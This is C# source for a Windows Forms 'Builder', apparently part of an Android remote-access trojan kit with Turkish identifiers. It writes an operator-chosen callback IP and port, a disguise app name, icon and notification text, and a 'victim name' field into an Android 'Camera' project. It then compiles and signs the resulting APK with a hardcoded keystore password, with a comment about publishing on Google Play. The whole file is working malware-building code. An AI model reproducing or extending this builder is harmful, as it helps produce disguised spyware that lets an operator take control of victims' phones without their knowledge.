using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace SV
{
    public partial class Builder : MetroFramework.Forms.MetroForm
    {
        public Builder()
        {
            InitializeComponent();
            pictureBox2.ImageLocation = Environment.CurrentDirectory + "\\resources\\Icon\\Icon.png";
            textBox4.Text = Form1.PASSWORD;
            checkBox2.CheckedChanged += checkBox2_CheckedChanged;
            button1.Click += button1_Click;
        }
        private async void build()
        {
            await Task.Run(() =>
            {
                try
                {
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] Building has started.");
                    string packageName = textBox1.Text;
                    int versionCode = 10;
                    string versionName = textBox2.Text;
                    stringValueleriYaz();

                    string msbuild = @dosyaYollari("msbuild");
                    string zipalign = @dosyaYollari("zip");
                    string jarsigner = @dosyaYollari("jarsigner");

                    string buildManifest = "Properties\\AndroidManifest.xml";
                    string androidProjectFolder = Environment.CurrentDirectory + @"\resources\ProjectFolder";
                    string androidProject = $"{androidProjectFolder}\\Camera.csproj";
                    string outputPath = Environment.CurrentDirectory + @"\outs\" + DateTime.Now.ToString("yyyyMMddHHmmss");
                    string abi = "tht";

                    string specificManifest = $"Properties\\AndroidManifest.{abi}_{versionCode}.xml";
                    string binPath = $"{outputPath}\\{abi}\\bin";
                    string objPath = $"{outputPath}\\{abi}\\obj";

                    string keystorePath = Environment.CurrentDirectory + "\\bocek.keystore";
                    string keystorePassword = "sagopa4141";
                    string keystoreKey = "bocek";

                    XDocument xmlFile = XDocument.Load($"{androidProjectFolder}\\{buildManifest}");
                    XElement mnfst = xmlFile.Elements("manifest").First();
                    XNamespace androidNamespace = mnfst.GetNamespaceOfPrefix("android");
                    mnfst.Attribute("package").Value = packageName;
                    mnfst.Attribute(androidNamespace + "versionName").Value = versionName;
                    mnfst.Attribute(androidNamespace + "versionCode").Value = "10";
                    xmlFile.Save($"{androidProjectFolder}\\{buildManifest}");

                    string unsignedApkPath = $"{binPath}\\{packageName}.apk";
                    string signedApkPath = $"{binPath}\\{packageName}_signed.apk";
                    string alignedApkPath = $"{binPath}\\{textBox7.Text.Replace(" ", "_")}.apk";

                    string mbuildArgs = $"{androidProject} /t:PackageForAndroid /t:restore /p:AndroidSupportedAbis=\"armeabi-v7a;x86;arm64-v8a;x86_64\" /p:Configuration=Release /p:IntermediateOutputPath={objPath}\\ /p:OutputPath={binPath}";
                    string jarsignerArgs = $"-verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystorePath} -storepass {keystorePassword} -signedjar \"{signedApkPath}\" {unsignedApkPath} {keystoreKey}";
                    string zipalignArgs = $"-f -v 4 {signedApkPath} {alignedApkPath}";


                    RunProcess(msbuild, mbuildArgs);
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] Compiled.");

                    RunProcess(jarsigner, jarsignerArgs);
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] APK signed.");

                    //Google Play'de yayınlayabilmeniz için.
                    RunProcess(zipalign, zipalignArgs);
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] Zipalign completed.");
                    
                    DirectoryInfo di = new DirectoryInfo(binPath);
                    FileInfo[] fi = di.GetFiles("*.*");
                    foreach (FileInfo f in fi)
                    {
                        if (!f.Name.Contains(textBox7.Text.Replace(" ", "_")))
                        {
                            f.Delete();
                        }
                    }
                    new DirectoryInfo(binPath).GetDirectories()[0].Delete(true);
                    Process.Start($"{binPath}");
                    
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] APK is ready.");
                }
                catch(Exception ex) { MessageBox.Show(ex.ToString(),"Build Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); }
            });
        }
        private void RunProcess(string filename, string arguments)
        {
            using (Process p = new Process())
            {
                p.StartInfo = new ProcessStartInfo(filename)
                {
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    Arguments = arguments,
                    WindowStyle = ProcessWindowStyle.Maximized
                };
                p.Start();
                p.WaitForExit();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox4.Text.Contains("<"))
            {
                MessageBox.Show(this, "You can't use this char <. because this is special char for Program", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                textBox4.Text = textBox1.Text.Replace("<", "");
                return;
            }
            if (textBox4.Text.Contains(">"))
            {
                MessageBox.Show(this, "You can't use this char >. because this is special char for Program", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                textBox4.Text = textBox1.Text.Replace(">", "");
                return;
            }
            build();
        }
        private string dosyaYollari(string input)
        {
            XDocument xmlFile = XDocument.Load(Environment.CurrentDirectory + @"\settings.xml");
            XElement mnfst = xmlFile.Elements("resources").First();
            foreach (var t in mnfst.Elements())
            {
                if(input == "zip")
                {
                    if(t.Attribute("name").Value == "zipalign")
                    {
                        return t.Value;
                    }
                }
                if (input == "msbuild")
                {
                    if (t.Attribute("name").Value == "msbuild")
                    {
                        return t.Value;
                    }
                }
                if (input == "jarsigner")
                {
                    if (t.Attribute("name").Value == "jarsigner")
                    {
                        return t.Value;
                    }
                }
            }
            return null;
        }
        private void stringValueleriYaz()
        {
            XDocument xmlFile = XDocument.Load(Environment.CurrentDirectory + @"\resources\ProjectFolder\Resources\values\Strings.xml");
            XElement mnfst = xmlFile.Elements("resources").First();
            foreach (var t in mnfst.Elements())
            {
                switch (t.Attribute("name").Value)
                {
                    case "app_name":
                        t.Value = textBox7.Text;
                        break;
                    case "service_started":
                        t.Value = textBox6.Text;
                        break;
                    case "notification_text":
                        t.Value = textBox5.Text;
                        break;
                    case "IP":
                        t.Value = textBox3.Text;
                        break;
                    case "PORT":
                        t.Value = numericUpDown1.Value.ToString();
                        break;
                    case "KURBANISMI":
                        t.Value = textBox8.Text;
                        break;
                    case "PASSWORD":
                        t.Value = textBox4.Text;
                        break;                 
                    case "Ignore":
                        t.Value = checkBox3.Checked ? "1" : "0";
                        break;
                }
            }
            xmlFile.Save(Environment.CurrentDirectory + @"\resources\ProjectFolder\Resources\values\Strings.xml");
        }
        private void button3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog op = new OpenFileDialog()
            {
                Multiselect = false,
                Filter = "72x72 sized .png image|*.png",
                Title = "Select a 72x72 sized .png image."
            })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    File.Copy(op.FileName, Environment.CurrentDirectory + "\\resources\\Icon\\Icon.png", true);
                    File.Copy(Environment.CurrentDirectory + "\\resources\\Icon\\Icon.png", Environment.CurrentDirectory + @"\resources\ProjectFolder\Resources\mipmap-hdpi\Icon.png", true);
                    pictureBox2.ImageLocation = Environment.CurrentDirectory + "\\resources\\Icon\\Icon.png";
                }
            }
        }
        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            textBox4.PasswordChar = (checkBox2.Checked) ? '\0' : '*';
        }
    }
}
